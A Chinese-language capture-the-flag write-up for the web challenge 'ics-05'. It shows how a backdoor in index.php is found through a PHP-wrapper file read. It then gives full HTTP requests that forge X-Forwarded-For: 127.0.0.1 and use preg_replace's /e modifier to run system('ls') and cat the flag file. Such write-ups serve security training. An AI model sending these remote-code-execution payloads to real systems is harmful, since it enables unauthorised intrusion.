# ics-05
### 题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统

页面只有 `设备维护中心` 可以跳转到首页 `index.php`. 点击 `云平台设备维护中心` 可以看到 `URL` 出现参数 `page` 可以注入.

刚开始我怀疑是 `SQL` 注入, 但试了一会儿也没发现什么特别. 于是我尝试看可不可以读 `index.php` 通过 `PHP 伪协议`. 数据返回在 `base64` 编码. 解码后得到 `index.php` 代码, 只需要注意这段:

```php
<?php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
?>
```

如果我们可以构造 `X-Forwarded-For` 是 `127.0.0.1`, 那我们可以成为 `admin`. (只访问 `/index.php`:)

```
GET /index.php HTTP/1.1
Host: 111.200.241.244:53890
...
X-Forwarded-For: 127.0.0.1
```

然后上传三个参数 `pat, rep, sub` 通过方式 `GET`. 系统会执行 `preg_replace($pattern, $replacement, $subject)`.

`preg_replace` 可以被利用当 `pattern` 为 `//e` 模式 (需要返回对). 那时候可以执行任何命令通过 `replacement`.

列出所有文件名:

```
GET /index.php?pat=/a/e&rep=system('ls')&sub=a HTTP/1.1
Host: 111.200.241.244:53890
...
X-Forwarded-For: 127.0.0.1
```

返回:

```
Welcome My Admin !
css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png
```

`flag` 在 `/var/www/html/s3chahahaDir/flag/flag.php` 里:

```
GET /index.php?pat=/a/e&rep=system('cat+/var/www/html/s3chahahaDir/flag/flag.php')&sub=a HTTP/1.1
Host: 111.200.241.244:53890
...
X-Forwarded-For: 127.0.0.1
```
